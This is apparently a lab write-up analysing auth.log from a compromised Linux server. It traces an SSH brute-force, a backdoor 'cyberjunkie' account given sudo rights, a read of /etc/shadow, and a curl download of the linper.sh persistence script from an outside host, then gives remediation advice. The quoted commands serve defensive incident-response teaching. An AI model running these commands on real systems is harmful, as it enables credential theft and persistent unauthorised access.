# Sherlock Scenario: Confluence Server SSH Compromise & Persistence
**Analyst:** Abdulrezzak AL-Ahmad
**Date of Analysis:** 2026-11-09
**Log Source:** `/var/log/auth.log` (Linux)
**Scenario:** Brute-force attack via SSH, followed by account creation, privilege escalation, and payload download.

---

##  Executive Summary
The server (identified as `ip-172-31-35-28`) was subjected to an SSH brute-force attack originating from the IP address **`65.2.161.68`**. The attacker successfully compromised the `root` account, gained an interactive session, and established persistence by creating a new local user named **`cyberjunkie`**. The attacker then granted this new user `sudo` privileges, used it to attempt credential dumping (`/etc/shadow`), and downloaded a malicious persistence script (`linper.sh`) from GitHub.

---

##  Timeline of Events

| Timestamp (UTC) | Event Description | MITRE ATT&CK / Notes |
| :--- | :--- | :--- |
| **06:31:31** | SSH Brute-force attack begins from `65.2.161.68`. | **T1110.001** (Password Guessing) |
| **06:31:40** | First successful login as `root` from `65.2.161.68`. Session 34 opens and closes instantly. | **T1078.003** (Local Accounts) |
| **06:32:44** | Attacker reconnects as `root` from `65.2.161.68`. Session **37** established for malicious activities. | **T1078.003** |
| **06:34:18** | Attacker creates a new user: `cyberjunkie` (UID: 1002). | **T1136.001** (Create Local Account) |
| **06:34:26** | Attacker sets a password for `cyberjunkie`. | |
| **06:35:15** | Attacker adds `cyberjunkie` to the `sudo` group. | **T1098** (Account Manipulation) / **T1548.003** (Sudo) |
| **06:37:24** | Attacker's `root` session (Session 37) ends. | |
| **06:37:34** | Attacker logs in using the new backdoor account `cyberjunkie` (Session 49). | **T1078.003** |
| **06:37:57** | Attacker uses `sudo` to read `/etc/shadow` (credential dumping). | **T1003.008** (OS Credential Dumping) |
| **06:39:38** | Attacker uses `sudo` to download `linper.sh` via `curl`. | **T1105** (Ingress Tool Transfer) |

---

##  Key Findings & Evidence

### 1. Brute-Force & Initial Access
The attacker targeted multiple common usernames (`admin`, `backup`, `server_adm`, `svc_account`, `root`) before successfully guessing the `root` password.
* **Attacker IP:** `65.2.161.68`
* **Evidence:** `Failed password for root from 65.2.161.68...` followed by `Accepted password for root...`

### 2. Persistence (Account Creation)
To ensure continued access, the attacker created a local backdoor account.
* **New Username:** `cyberjunkie`
* **UID:** 1002
* **Evidence:** `useradd[2592]: new user: name=cyberjunkie, UID=1002...`

### 3. Privilege Escalation
The attacker added the new account to the `sudo` group to retain root-level access.
* **Command:** `usermod -aG sudo cyberjunkie`
* **Evidence:** `usermod[2628]: add 'cyberjunkie' to group 'sudo'`

### 4. Credential Access
Using the new account, the attacker attempted to dump hashed passwords.
* **Command:** `sudo cat /etc/shadow`
* **Evidence:** `sudo: cyberjunkie : ... COMMAND=/usr/bin/cat /etc/shadow`

### 5. Tool Transfer
The attacker downloaded a malicious script to maintain persistence.
* **Command:** `sudo curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
* **Evidence:** `sudo: cyberjunkie : ... COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`

### 6. Session Tracking (wtmp vs auth.log)
* The attacker's `root` login authentication occurred at **06:32:44**.
* The actual interactive terminal session (`wtmp`) was established at **06:32:45**.
* The first *real* malicious session (Session 37) ended at **06:37:24**.

---

##  Recommendations
1. **Block the IP:** Immediately block `65.2.161.68` at the firewall.
2. **Disable Root SSH Login:** Modify `/etc/ssh/sshd_config` to set `PermitRootLogin no`.
3. **Enforce Strong Passwords & MFA:** Prevent future brute-force attacks.
4. **Audit Sudoers:** Review `/etc/sudoers` and remove unauthorized users (like `cyberjunkie`).
5. **Investigate the Payload:** Analyze `linper.sh` to see if any cron jobs or systemd services were modified.
6. **Password Reset:** Since `/etc/shadow` was accessed, all user passwords on the system should be reset immediately.

---
*End of Report*
